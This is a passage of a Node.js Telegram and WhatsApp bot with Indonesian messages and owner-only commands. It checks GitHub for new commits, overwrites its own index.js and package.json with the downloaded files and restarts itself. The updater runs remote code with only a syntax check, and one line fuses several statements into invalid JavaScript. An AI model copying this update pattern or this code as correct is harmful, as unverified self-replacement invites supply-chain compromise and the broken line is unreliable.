    const rawBase = `${GITHUB.RAW_BASE}/${GITHUB.OWNER}/${GITHUB.REPO}/${remote.sha}`
    for (const f of ["index.js", "package.json"]) {
      try {
        const { data } = await axios.get(`${rawBase}/${f}`, { timeout: 20000, responseType: "text" })
        fs.writeFileSync(`${f}.tmp`, data)
        fs.renameSync(`${f}.tmp`, f)
      } catch (e) { if (e.response?.status !== 404) throw e }
    }
    try { execSync("node --check index.js", { stdio: "pipe" }) } catch { throw new Error("Syntax error setelah update") }
    entry.result = "success"
    entry.completed = new Date().toISOString()
    entry.duration = ((Date.now() - start) / 1000).toFixed(2) + "s"
    history.push(entry)
    saveUpdateHistory(history)
    fs.writeFileSync(PATHS.PENDING_NOTIF, JSON.stringify({ ownerId, entry })) await ctx.reply("♻️ Bot akan restart dalam 3 detik...") setTimeout(async () => {
  await restartPanel() }, 3000)
  } catch (e) {
    entry.result = "failed"
    entry.error = e.message
    entry.completed = new Date().toISOString()
    entry.duration = ((Date.now() - start) / 1000).toFixed(2) + "s"
    if (backupDir && fs.existsSync(backupDir)) {
      try { for (const f of fs.readdirSync(backupDir)) fs.copyFileSync(path.join(backupDir, f), f) } catch {}
    }
    history.push(entry)
    saveUpdateHistory(history)
    throw e
  } finally { updateInProgress = false }
}

async function schedulerTick(ownerId) {
  try {
    const { remote, isNew } = await checkForUpdates()
    if (!isNew) return
    saveLastNotified({ sha: remote.sha, date: new Date().toISOString() })
    await bot.telegram.sendMessage(
      ownerId,
      `${emo(EMOJI.UPDATE, "🆕")} <b>UPDATE AVAILABLE</b>\n\nCommit: <code>${remote.sha.slice(0, 7)}</code>\nPesan: ${remote.message.slice(0, 80)}\nAuthor: ${remote.author}\n\nKetik /update untuk memulai.`,
      { parse_mode: "HTML" }
    )
  } catch (e) { console.log("Scheduler err:", e.message) }
}

function startScheduler(ownerId) {
  if (schedulerInterval) return
  schedulerInterval = setInterval(() => schedulerTick(ownerId), UPDATE_INTERVAL_MS)
  setTimeout(() => schedulerTick(ownerId), 30000)
  console.log(chalk.green(`✅ Update Scheduler aktif (${UPDATE_INTERVAL_MS / 3600000} jam)`))
}

bot.command("update", checkOwner, async (ctx) => {
  try {
    await ctx.reply("🔄 Memeriksa update...")
    const { remote, isNew } = await checkForUpdates()
    if (!isNew) {
      return ctx.sendRichMessage(buildUpdateUpToDate(remote), { reply_markup: subKeyboard() })
    }
    await ctx.sendRichMessage(buildUpdateAvailable(remote), { reply_markup: subKeyboard() })
  } catch (e) {
    const msg = new HTML()
      .slideshow(...slideshowLine())
      .heading(1, "✦ UPDATE FAILED ✦")
      .paragraph(e.message)
      .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
      .build()
    await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
  }
})

bot.command("updateconfirm", checkOwner, async (ctx) => {
  try {
    await ctx.reply("🚀 Memulai update...")
    await performUpdate(ctx, String(ctx.from.id))
  } catch (e) {
    const msg = new HTML()
      .slideshow(...slideshowLine())
      .heading(1, "✦ UPDATE FAILED ✦")
      .paragraph(e.message)
      .footer(`${SYSTEM.NAME} • v${SYSTEM.VERSION} • ${SYSTEM.GEN}`)
      .build()
    await ctx.sendRichMessage(msg, { reply_markup: subKeyboard() })
  }
})

;(async () => {
  try {
    console.clear()
    const startTime = Date.now()

    console.log(chalk.cyan(`
╔══════════════════════════════╗
║   ⚡ ZEPHYR DEVIL — BOOTING  ⚡   ║
╚══════════════════════════════╝
`))

    console.log(chalk.cyan("🔄 Loading state..."))
    refreshState()
    console.log(chalk.green(`✅ Mode Loaded → ${currentMode}`))
    console.log(chalk.green(`✅ Owner Count → ${ownerUsers.length}`))

    console.log(chalk.cyan("📡 Connecting WhatsApp session..."))
    await startSesi()
    console.log(chalk.green("✅ WhatsApp Connected"))

    console.log(chalk.cyan("🤖 Launching Telegram bot..."))
    await bot.launch()
    console.log(chalk.green("✅ Telegram Bot Active"))

    if (ownerUsers.length > 0) startScheduler(ownerUsers[0])

    if (fs.existsSync(PATHS.PENDING_NOTIF)) {
      try {
        const pending = JSON.parse(fs.readFileSync(PATHS.PENDING_NOTIF, "utf8"))
        const { ownerId, entry } = pending
        await bot.telegram.sendMessage(
          ownerId,
          `${emo(EMOJI.SUCCESS, "✅")} <b>UPDATE SUCCESS</b>\n\nVersi Sebelum: ${entry.versionFrom}\nVersi Baru: ${entry.versionTo}\nCommit: <code>${entry.commit.slice(0, 7)}</code>\nDurasi: ${entry.duration}\nStatus: Berhasil setelah restart`,
          { parse_mode: "HTML" }
        )
        fs.unlinkSync(PATHS.PENDING_NOTIF)
      } catch (e) { console.error("Gagal kirim notifikasi pending:", e.message) }
    }

    process.once("SIGINT", () => { console.log(chalk.yellow("🛑 SIGINT — shutting down")); bot.stop("SIGINT") })
    process.once("SIGTERM", () => { console.log(chalk.yellow("🛑 SIGTERM — shutting down")); bot.stop("SIGTERM") })

    const uptime = ((Date.now() - startTime) / 1000).toFixed(2)

    console.log(chalk.green(`
╔══════════════════════════════╗
║   🟢 SYSTEM ACTIVED & ONLINE     ║
╠══════════════════════════════╣
║ ⏱️ Startup : ${uptime}s
║ 🔐 Status  : SECURE
║ 🌸 System  : ACTIVE
╚══════════════════════════════╝
`))
  } catch (err) {
    console.clear()
    console.log(chalk.red(`
╔══════════════════════════════╗
║      ❌ SYSTEM GAGAL        ║
╚══════════════════════════════╝
`))
    console.error(chalk.red(err))
    setTimeout(() => { console.log(chalk.yellow("🔄 Auto Restarting...")); process.exit(1) }, 3000)
  }
})()